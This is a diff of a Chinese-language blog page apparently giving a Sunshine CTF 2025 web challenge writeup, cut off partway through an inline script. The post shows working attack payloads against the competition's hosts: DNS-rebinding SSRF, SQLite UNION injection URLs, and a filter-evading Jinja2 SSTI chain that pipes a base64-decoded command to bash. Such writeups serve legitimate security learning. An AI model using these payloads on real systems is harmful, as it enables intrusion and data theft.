@@ -1,571 +1,148 @@
-<!DOCTYPE html>
-<html lang="en" dir="auto">
-
-<head><meta charset="utf-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
-<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="index, follow">
-<title>Sunshine CTF 2025 WEB Writeup | w8nn9z Blog</title>
-<meta name="keywords" content="">
-<meta name="description" content="Sunshine CTF 2025 WEB Writeup - w8nn9z Blog">
-<meta name="author" content="">
-<link rel="canonical" href="https://z9nn8w.github.io/posts/ctf/sunshine-ctf-2025-web-writeup/">
-
-<link crossorigin="anonymous" href="/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css" integrity="" rel="preload stylesheet" as="style">
-<link rel="icon" href="https://z9nn8w.github.io/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="https://z9nn8w.github.io/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="https://z9nn8w.github.io/favicon-32x32.png">
-<link rel="apple-touch-icon" href="https://z9nn8w.github.io/apple-touch-icon.png">
-<link rel="mask-icon" href="https://z9nn8w.github.io/safari-pinned-tab.svg">
-<meta name="theme-color" content="#2e2e33">
-<meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="https://z9nn8w.github.io/posts/ctf/sunshine-ctf-2025-web-writeup/">
-<noscript>
-    <style>
-        #theme-toggle,
-        .top-link {
-            display: none;
-        }
-
-    </style>
-    <style>
-        @media (prefers-color-scheme: dark) {
-            :root {
-                --theme: rgb(29, 30, 32);
-                --entry: rgb(46, 46, 51);
-                --primary: rgb(218, 218, 219);
-                --secondary: rgb(155, 156, 157);
-                --tertiary: rgb(65, 66, 68);
-                --content: rgb(196, 196, 197);
-                --code-block-bg: rgb(46, 46, 51);
-                --code-bg: rgb(55, 56, 62);
-                --border: rgb(51, 51, 51);
-            }
-
-            .list {
-                background: var(--theme);
-            }
-
-            .list:not(.dark)::-webkit-scrollbar-track {
-                background: 0 0;
-            }
-
-            .list:not(.dark)::-webkit-scrollbar-thumb {
-                border-color: var(--theme);
-            }
-        }
-
-    </style>
-</noscript><meta property="og:url" content="https://z9nn8w.github.io/posts/ctf/sunshine-ctf-2025-web-writeup/">
-  <meta property="og:site_name" content="w8nn9z Blog">
-  <meta property="og:title" content="Sunshine CTF 2025 WEB Writeup">
-  <meta property="og:locale" content="zh-cn">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-09-29T00:00:00+00:00">
-    <meta property="article:modified_time" content="2025-09-29T00:00:00+00:00">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Sunshine CTF 2025 WEB Writeup">
-<meta name="twitter:description" content="">
-
-
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BreadcrumbList",
-  "itemListElement": [
-    {
-      "@type": "ListItem",
-      "position":  1 ,
-      "name": "Posts",
-      "item": "https://z9nn8w.github.io/posts/"
-    }, 
-    {
-      "@type": "ListItem",
-      "position":  2 ,
-      "name": "CTF",
-      "item": "https://z9nn8w.github.io/posts/ctf/"
-    }, 
-    {
-      "@type": "ListItem",
-      "position":  3 ,
-      "name": "Sunshine CTF 2025 WEB Writeup",
-      "item": "https://z9nn8w.github.io/posts/ctf/sunshine-ctf-2025-web-writeup/"
-    }
-  ]
-}
-</script>
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BlogPosting",
-  "headline": "Sunshine CTF 2025 WEB Writeup",
-  "name": "Sunshine CTF 2025 WEB Writeup",
-  "description": "",
-  "keywords": [
-    
-  ],
-  "articleBody": "Lunar Auth robots.txt：\n# tired of these annoying search engine bots scraping the admin panel page logins:\rDisallow: /admin /admin有一段前端登录验证：\n\u003cscript\u003e /* To reduce load on our servers from the recent space DDOS-ers we have lowered login attempts by using Base64 encoded encryption (\"encryption\" 💀) on the client side. TODO: implement proper encryption. */ const real_username = atob(\"YWxpbXVoYW1tYWRzZWN1cmVk\"); const real_passwd = atob(\"UzNjdXI0X1BAJCR3MFJEIQ==\"); document.addEventListener(\"DOMContentLoaded\", () =\u003e { const form = document.querySelector(\"form\"); function handleSubmit(evt) { evt.preventDefault(); const username = form.elements[\"username\"].value; const password = form.elements[\"password\"].value; if (username === real_username \u0026\u0026 password === real_passwd) { // remove this handler and allow form submission form.removeEventListener(\"submit\", handleSubmit); form.submit(); } else { alert(\"[ Invalid credentials ]\"); } } form.addEventListener(\"submit\", handleSubmit); }); \u003c/script\u003e 解码base64得到username和password分别为alimuhammadsecured和S3cur4_P@$$w0RD!，登录拿到flag：\nMission Control — FLAG\rAuthorized access confirmed. Presenting mission artifact:\rsun{cl1ent_s1d3_auth_1s_N3V3R_a_g00d_1d3A_983765367890393232} Intergalactic Webhook Service app.py：\nimport threading from flask import Flask, request, abort, render_template, jsonify import requests from urllib.parse import urlparse from http.server import BaseHTTPRequestHandler, HTTPServer import socket import ipaddress import uuid def load_flag(): with open('flag.txt', 'r') as f: return f.read().strip() FLAG = load_flag() class FlagHandler(BaseHTTPRequestHandler): def do_POST(self): if self.path == '/flag': self.send_response(200) self.send_header('Content-Type', 'text/plain') self.end_headers() self.wfile.write(FLAG.encode()) else: self.send_response(404) self.end_headers() threading.Thread(target=lambda: HTTPServer(('127.0.0.1', 5001), FlagHandler).serve_forever(), daemon=True).start() app = Flask(__name__) registered_webhooks = {} def create_app(): return app @app.route('/') def index(): return render_template('index.html') def is_ip_allowed(url): parsed = urlparse(url) host = parsed.hostname or '' try: ip = socket.gethostbyname(host) except Exception: return False, f'Could not resolve host' ip_obj = ipaddress.ip_address(ip) if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local or ip_obj.is_reserved: return False, f'IP \"{ip}\" not allowed' return True, None @app.route('/register', methods=['POST']) def register_webhook(): url = request.form.get('url') if not url: abort(400, 'Missing url parameter') allowed, reason = is_ip_allowed(url) if not allowed: return reason, 400 webhook_id = str(uuid.uuid4()) registered_webhooks[webhook_id] = url return jsonify({'status': 'registered', 'url': url, 'id': webhook_id}), 200 @app.route('/trigger', methods=['POST']) def trigger_webhook(): webhook_id = request.form.get('id') if not webhook_id: abort(400, 'Missing webhook id') url = registered_webhooks.get(webhook_id) if not url: return jsonify({'error': 'Webhook not found'}), 404 allowed, reason = is_ip_allowed(url) if not allowed: return jsonify({'error': reason}), 400 try: resp = requests.post(url, timeout=5, allow_redirects=False) return jsonify({'url': url, 'status': resp.status_code, 'response': resp.text}), resp.status_code except Exception: return jsonify({'url': url, 'error': 'something went wrong'}), 500 if __name__ == '__main__': print('listening on port 5000') app.run(host='0.0.0.0', port=5000) 5001端口绑定了提供flag的服务，5000端口提供正常的web服务，思路是通过/register路由注册url，再通过/trigger路由打SSRF，但是对于is_ip_allowed对于url的限制很严格，简单来看就是过滤了本地ip，同时/trigger路由不允许重定向，无法使用自己的vps搭建的网页中的恶意javascript进行fetch，利用DNS重绑定来绕过：http://08080808.7f000001.rbndr.us:5001/flag\n由于服务器设置的是随机返回第一个或第二个ip，需要多trigger几次：\n{\"response\":\"sun{dns_r3b1nd1ng_1s_sup3r_c00l!_ff4bd67cd1}\",\"status\":200,\"url\":\"http://08080808.7f000001.rbndr.us:5001/flag\"} 参考资料：\nhttps://docs.python.org/zh-cn/3/howto/ipaddress.html\nhttps://lock.cmpxchg8b.com/rebinder.html\nLunar Shop SQLite注入，注入点为product_id：\nhttps://meteor.sunshinectf.games/product?product_id=0%20union%20select%201,2,3,group_concat(tbl_name)%20from%20sqlite_master%20where%20type=%27table%27%20--+\rhttps://meteor.sunshinectf.games/product?product_id=0%20union%20select%201,2,3,flag%20from%20flag%20--+ sun{baby_SQL_injection_this_is_known_as_error_based_SQL_injection_8767289082762892}\nWeb Forge robots.txt：\nUser-agent: *\rDisallow: /admin\rDisallow: /fetch\r# internal SSRF testing tool requires special auth header to be set to 'true' 使用ffuf进行header的fuzz：\nffuf -u https://wormhole.sunshinectf.games/fetch -H \"FUZZ: true\" -w uppercase-headers.txt -mc 200\rALLOW [Status: 200, Size: 5252, Words: 1498, Lines: 210, Duration: 1630ms] 找到了访问/fetch服务的header：ALLOW，置为true，尝试对/admin进行SSRF工具测试：\nurl=http://127.0.0.1/admin\rYou're trying to access /admin but forgot the ?template= parameter 猜测是SSTI，但是尝试SSTI检测报错：\nurl=http://127.0.0.1/admin?template={{7*7}}\rHTTPConnectionPool(host='127.0.0.1', port=80): Max retries exceeded with url: /admin?template={{7*7}}\r(Caused by NewConnectionError(': Failed to establish a new connection: [Errno 111] Connection refused') 无法正常连接到服务，猜测不是80端口，利用BurpSuite来爆破出端口8000，常规的SSTI利用无回显，直接上一个能绕过比较多过滤的payload：\nurl=http://127.0.0.1:8000/admin?template={{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('whoami')|attr('read')()}} 但是同样无法执行cat等文件读取的命令，使用base64编解码绕过：\nurl=http://127.0.0.1:8000/admin?template={{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('echo+Y2F0IGZsYWcudHh0|base64+-d|bash')|attr('read')()}} sun{h34der_fuzz1ng_4nd_ssti_1s_3asy_bc10bf85cabe7078}\n参考资料：\nhttps://onsecurity.io/article/server-side-template-injection-with-jinja2/\n",
-  "wordCount" : "1071",
-  "inLanguage": "en",
-  "datePublished": "2025-09-29T00:00:00Z",
-  "dateModified": "2025-09-29T00:00:00Z",
-  "mainEntityOfPage": {
-    "@type": "WebPage",
-    "@id": "https://z9nn8w.github.io/posts/ctf/sunshine-ctf-2025-web-writeup/"
-  },
-  "publisher": {
-    "@type": "Organization",
-    "name": "w8nn9z Blog",
-    "logo": {
-      "@type": "ImageObject",
-      "url": "https://z9nn8w.github.io/favicon.ico"
-    }
-  }
-}
-</script>
-</head>
-
-<body class="" id="top">
-<script>
-    if (localStorage.getItem("pref-theme") === "dark") {
-        document.body.classList.add('dark');
-    } else if (localStorage.getItem("pref-theme") === "light") {
-        document.body.classList.remove('dark')
-    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
-        document.body.classList.add('dark');
-    }
-
-</script>
-
-<header class="header">
-    <nav class="nav">
-        <div class="logo">
-            <a href="https://z9nn8w.github.io/" accesskey="h" title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a>
-            <div class="logo-switches">
-                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
-                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
-                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                        stroke-linejoin="round">
-                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
-                    </svg>
-                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
-                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                        stroke-linejoin="round">
-                        <circle cx="12" cy="12" r="5"></circle>
-                        <line x1="12" y1="1" x2="12" y2="3"></line>
-                        <line x1="12" y1="21" x2="12" y2="23"></line>
-                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
-                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
-                        <line x1="1" y1="12" x2="3" y2="12"></line>
-                        <line x1="21" y1="12" x2="23" y2="12"></line>
-                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
-                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
-                    </svg>
-                </button>
-            </div>
-        </div>
-        <ul id="menu">
-            <li>
-                <a href="https://z9nn8w.github.io/search" title="搜索 (Alt &#43; /)" accesskey=/>
-                    <span>搜索</span>
-                </a>
-            </li>
-            <li>
-                <a href="https://z9nn8w.github.io/posts" title="文章">
-                    <span>文章</span>
-                </a>
-            </li>
-            <li>
-                <a href="https://z9nn8w.github.io/archives" title="归档">
-                    <span>归档</span>
-                </a>
-            </li>
-            <li>
-                <a href="https://z9nn8w.github.io/about" title="关于">
-                    <span>关于</span>
-                </a>
-            </li>
-        </ul>
-    </nav>
-</header>
-<main class="main">
-
-<article class="post-single">
-  <header class="post-header">
-    
-    <h1 class="post-title entry-hint-parent">
-      Sunshine CTF 2025 WEB Writeup
-    </h1>
-    <div class="post-meta"><span title='2025-09-29 00:00:00 +0000 UTC'>September 29, 2025</span>
-
-</div>
-  </header> <aside id="toc-container" class="toc-container wide">
-    <div class="toc">
-        <details >
-            <summary accesskey="c" title="(Alt + C)">
-                <span class="details">Table of Contents</span>
-            </summary>
-
-            <div class="inner"><ul>
-                    <li>
-                        <a href="#lunar-auth" aria-label="Lunar Auth">Lunar Auth</a></li>
-                    <li>
-                        <a href="#intergalactic-webhook-service" aria-label="Intergalactic Webhook Service">Intergalactic Webhook Service</a></li>
-                    <li>
-                        <a href="#lunar-shop" aria-label="Lunar Shop">Lunar Shop</a></li>
-                    <li>
-                        <a href="#web-forge" aria-label="Web Forge">Web Forge</a>
-                    </li>
-                </ul>
-            </div>
-        </details>
-    </div>
-</aside>
-<script>
-    let activeElement;
-    let elements;
-    
-    document.addEventListener('DOMContentLoaded', function (event) {
-        checkTocPosition();
-    
-        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
-        if (elements.length > 0) {
-            
-            activeElement = elements[0];
-            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
-            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
-        }
-    
-        
-        const topLink = document.getElementById('top-link');
-        if (topLink) {
-            topLink.addEventListener('click', (event) => {
-                
-                event.preventDefault();
-    
-                
-                window.scrollTo({ top: 0, behavior: 'smooth' });
-            });
-        }
-    }, false);
-    
-    window.addEventListener('resize', function(event) {
-        checkTocPosition();
-    }, false);
-    
-    window.addEventListener('scroll', () => {
-        
-        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
-    
-        
-        if (scrollPosition === 0) {
-            return;
-        }
-    
-        
-        if (elements && elements.length > 0) {
-            
-            activeElement = Array.from(elements).find((element) => {
-                if ((getOffsetTop(element) - scrollPosition) > 0 && 
-                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
-                    return element;
-                }
-            }) || activeElement;
-    
-            elements.forEach(element => {
-                const id = encodeURI(element.getAttribute('id')).toLowerCase();
-                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
-                if (element === activeElement){
-                    tocLink.classList.add('active');
-    
-                    
-                    const tocContainer = document.querySelector('.toc .inner');
-                    const linkOffsetTop = tocLink.offsetTop;
-                    const containerHeight = tocContainer.clientHeight;
-                    const linkHeight = tocLink.clientHeight;
-    
-                    
-                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
-                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
-                } else {
-                    tocLink.classList.remove('active');
-                }
-            });
-        }
-    }, false);
-    
-    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
-    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
-    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
-    
-    function checkTocPosition() {
-        const width = document.body.scrollWidth;
-    
-        if (width - main - (toc * 2) - (gap * 4) > 0) {
-            document.getElementById("toc-container").classList.add("wide");
-        } else {
-            document.getElementById("toc-container").classList.remove("wide");
-        }
-    }
-    
-    function getOffsetTop(element) {
-        if (!element.getClientRects().length) {
-            return 0;
-        }
-        let rect = element.getBoundingClientRect();
-        let win = element.ownerDocument.defaultView;
-        return rect.top + win.pageYOffset;   
-    }
-    
-</script>
-
-  <div class="post-content"><h2 id="lunar-auth">Lunar Auth<a hidden class="anchor" aria-hidden="true" href="#lunar-auth">#</a></h2>
-<p>robots.txt：</p>
-<pre tabindex="0"><code># tired of these annoying search engine bots scraping the admin panel page logins:
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Sunshine CTF 2025 WEB Writeup | w8nn9z Blog</title><meta name=keywords content><meta name=description content="Sunshine CTF 2025 WEB Writeup - w8nn9z Blog"><meta name=author content><link rel=canonical href=https://blog.w8nn9z.top/posts/ctf/sunshine-ctf-2025-web-writeup/><link crossorigin=anonymous href=/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css integrity rel="preload stylesheet" as=style><link rel=icon href=https://blog.w8nn9z.top/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://blog.w8nn9z.top/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://blog.w8nn9z.top/favicon-32x32.png><link rel=apple-touch-icon href=https://blog.w8nn9z.top/apple-touch-icon.png><link rel=mask-icon href=https://blog.w8nn9z.top/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://blog.w8nn9z.top/posts/ctf/sunshine-ctf-2025-web-writeup/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://blog.w8nn9z.top/posts/ctf/sunshine-ctf-2025-web-writeup/"><meta property="og:site_name" content="w8nn9z Blog"><meta property="og:title" content="Sunshine CTF 2025 WEB Writeup"><meta property="og:locale" content="zh-cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-09-29T00:00:00+00:00"><meta property="article:modified_time" content="2025-09-29T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Sunshine CTF 2025 WEB Writeup"><meta name=twitter:description content><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://blog.w8nn9z.top/posts/"},{"@type":"ListItem","position":2,"name":"CTF","item":"https://blog.w8nn9z.top/posts/ctf/"},{"@type":"ListItem","position":3,"name":"Sunshine CTF 2025 WEB Writeup","item":"https://blog.w8nn9z.top/posts/ctf/sunshine-ctf-2025-web-writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Sunshine CTF 2025 WEB Writeup","name":"Sunshine CTF 2025 WEB Writeup","description":"","keywords":[],"articleBody":"Lunar Auth robots.txt：\n# tired of these annoying search engine bots scraping the admin panel page logins:\rDisallow: /admin /admin有一段前端登录验证：\n\u003cscript\u003e /* To reduce load on our servers from the recent space DDOS-ers we have lowered login attempts by using Base64 encoded encryption (\"encryption\" 💀) on the client side. TODO: implement proper encryption. */ const real_username = atob(\"YWxpbXVoYW1tYWRzZWN1cmVk\"); const real_passwd = atob(\"UzNjdXI0X1BAJCR3MFJEIQ==\"); document.addEventListener(\"DOMContentLoaded\", () =\u003e { const form = document.querySelector(\"form\"); function handleSubmit(evt) { evt.preventDefault(); const username = form.elements[\"username\"].value; const password = form.elements[\"password\"].value; if (username === real_username \u0026\u0026 password === real_passwd) { // remove this handler and allow form submission form.removeEventListener(\"submit\", handleSubmit); form.submit(); } else { alert(\"[ Invalid credentials ]\"); } } form.addEventListener(\"submit\", handleSubmit); }); \u003c/script\u003e 解码base64得到username和password分别为alimuhammadsecured和S3cur4_P@$$w0RD!，登录拿到flag：\nMission Control — FLAG\rAuthorized access confirmed. Presenting mission artifact:\rsun{cl1ent_s1d3_auth_1s_N3V3R_a_g00d_1d3A_983765367890393232} Intergalactic Webhook Service app.py：\nimport threading from flask import Flask, request, abort, render_template, jsonify import requests from urllib.parse import urlparse from http.server import BaseHTTPRequestHandler, HTTPServer import socket import ipaddress import uuid def load_flag(): with open('flag.txt', 'r') as f: return f.read().strip() FLAG = load_flag() class FlagHandler(BaseHTTPRequestHandler): def do_POST(self): if self.path == '/flag': self.send_response(200) self.send_header('Content-Type', 'text/plain') self.end_headers() self.wfile.write(FLAG.encode()) else: self.send_response(404) self.end_headers() threading.Thread(target=lambda: HTTPServer(('127.0.0.1', 5001), FlagHandler).serve_forever(), daemon=True).start() app = Flask(__name__) registered_webhooks = {} def create_app(): return app @app.route('/') def index(): return render_template('index.html') def is_ip_allowed(url): parsed = urlparse(url) host = parsed.hostname or '' try: ip = socket.gethostbyname(host) except Exception: return False, f'Could not resolve host' ip_obj = ipaddress.ip_address(ip) if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local or ip_obj.is_reserved: return False, f'IP \"{ip}\" not allowed' return True, None @app.route('/register', methods=['POST']) def register_webhook(): url = request.form.get('url') if not url: abort(400, 'Missing url parameter') allowed, reason = is_ip_allowed(url) if not allowed: return reason, 400 webhook_id = str(uuid.uuid4()) registered_webhooks[webhook_id] = url return jsonify({'status': 'registered', 'url': url, 'id': webhook_id}), 200 @app.route('/trigger', methods=['POST']) def trigger_webhook(): webhook_id = request.form.get('id') if not webhook_id: abort(400, 'Missing webhook id') url = registered_webhooks.get(webhook_id) if not url: return jsonify({'error': 'Webhook not found'}), 404 allowed, reason = is_ip_allowed(url) if not allowed: return jsonify({'error': reason}), 400 try: resp = requests.post(url, timeout=5, allow_redirects=False) return jsonify({'url': url, 'status': resp.status_code, 'response': resp.text}), resp.status_code except Exception: return jsonify({'url': url, 'error': 'something went wrong'}), 500 if __name__ == '__main__': print('listening on port 5000') app.run(host='0.0.0.0', port=5000) 5001端口绑定了提供flag的服务，5000端口提供正常的web服务，思路是通过/register路由注册url，再通过/trigger路由打SSRF，但是对于is_ip_allowed对于url的限制很严格，简单来看就是过滤了本地ip，同时/trigger路由不允许重定向，无法使用自己的vps搭建的网页中的恶意javascript进行fetch，利用DNS重绑定来绕过：http://08080808.7f000001.rbndr.us:5001/flag\n由于服务器设置的是随机返回第一个或第二个ip，需要多trigger几次：\n{\"response\":\"sun{dns_r3b1nd1ng_1s_sup3r_c00l!_ff4bd67cd1}\",\"status\":200,\"url\":\"http://08080808.7f000001.rbndr.us:5001/flag\"} 参考资料：\nhttps://docs.python.org/zh-cn/3/howto/ipaddress.html\nhttps://lock.cmpxchg8b.com/rebinder.html\nLunar Shop SQLite注入，注入点为product_id：\nhttps://meteor.sunshinectf.games/product?product_id=0%20union%20select%201,2,3,group_concat(tbl_name)%20from%20sqlite_master%20where%20type=%27table%27%20--+\rhttps://meteor.sunshinectf.games/product?product_id=0%20union%20select%201,2,3,flag%20from%20flag%20--+ sun{baby_SQL_injection_this_is_known_as_error_based_SQL_injection_8767289082762892}\nWeb Forge robots.txt：\nUser-agent: *\rDisallow: /admin\rDisallow: /fetch\r# internal SSRF testing tool requires special auth header to be set to 'true' 使用ffuf进行header的fuzz：\nffuf -u https://wormhole.sunshinectf.games/fetch -H \"FUZZ: true\" -w uppercase-headers.txt -mc 200\rALLOW [Status: 200, Size: 5252, Words: 1498, Lines: 210, Duration: 1630ms] 找到了访问/fetch服务的header：ALLOW，置为true，尝试对/admin进行SSRF工具测试：\nurl=http://127.0.0.1/admin\rYou're trying to access /admin but forgot the ?template= parameter 猜测是SSTI，但是尝试SSTI检测报错：\nurl=http://127.0.0.1/admin?template={{7*7}}\rHTTPConnectionPool(host='127.0.0.1', port=80): Max retries exceeded with url: /admin?template={{7*7}}\r(Caused by NewConnectionError(': Failed to establish a new connection: [Errno 111] Connection refused') 无法正常连接到服务，猜测不是80端口，利用BurpSuite来爆破出端口8000，常规的SSTI利用无回显，直接上一个能绕过比较多过滤的payload：\nurl=http://127.0.0.1:8000/admin?template={{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('whoami')|attr('read')()}} 但是同样无法执行cat等文件读取的命令，使用base64编解码绕过：\nurl=http://127.0.0.1:8000/admin?template={{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('echo+Y2F0IGZsYWcudHh0|base64+-d|bash')|attr('read')()}} sun{h34der_fuzz1ng_4nd_ssti_1s_3asy_bc10bf85cabe7078}\n参考资料：\nhttps://onsecurity.io/article/server-side-template-injection-with-jinja2/\n","wordCount":"1071","inLanguage":"en","datePublished":"2025-09-29T00:00:00Z","dateModified":"2025-09-29T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.w8nn9z.top/posts/ctf/sunshine-ctf-2025-web-writeup/"},"publisher":{"@type":"Organization","name":"w8nn9z Blog","logo":{"@type":"ImageObject","url":"https://blog.w8nn9z.top/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://blog.w8nn9z.top/ accesskey=h title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://blog.w8nn9z.top/search title="搜索 (Alt + /)" accesskey=/><span>搜索</span></a></li><li><a href=https://blog.w8nn9z.top/posts title=文章><span>文章</span></a></li><li><a href=https://blog.w8nn9z.top/archives title=归档><span>归档</span></a></li><li><a href=https://blog.w8nn9z.top/about title=关于><span>关于</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Sunshine CTF 2025 WEB Writeup</h1><div class=post-meta><span title='2025-09-29 00:00:00 +0000 UTC'>September 29, 2025</span></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#lunar-auth aria-label="Lunar Auth">Lunar Auth</a></li><li><a href=#intergalactic-webhook-service aria-label="Intergalactic Webhook Service">Intergalactic Webhook Service</a></li><li><a href=#lunar-shop aria-label="Lunar Shop">Lunar Shop</a></li><li><a href=#web-forge aria-label="Web Forge">Web Forge</a></li></ul></div></details></div></aside><script>let activeElement,elements;document.addEventListener("DOMContentLoaded",function(){if(checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),elements.length>0){activeElement=elements[0];const e=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${e}"]`).classList.add("active")}const t=document.getElementById("top-link");t&&t.addEventListener("click",e=>{e.preventDefault(),window.scrollTo({top:0,behavior:"smooth"})})},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{const e=window.pageYOffset||document.documentElement.scrollTop;if(e===0)return;elements&&elements.length>0&&(activeElement=Array.from(elements).find(t=>{if(getOffsetTop(t)-e>0&&getOffsetTop(t)-e<window.innerHeight/2)return t})||activeElement,elements.forEach(e=>{const n=encodeURI(e.getAttribute("id")).toLowerCase(),t=document.querySelector(`.inner ul li a[href="#${n}"]`);if(e===activeElement){t.classList.add("active");const e=document.querySelector(".toc .inner"),n=t.offsetTop,s=e.clientHeight,o=t.clientHeight,i=n-s/2+o/2;e.scrollTo({top:i,behavior:"smooth"})}else t.classList.remove("active")}))},!1);const 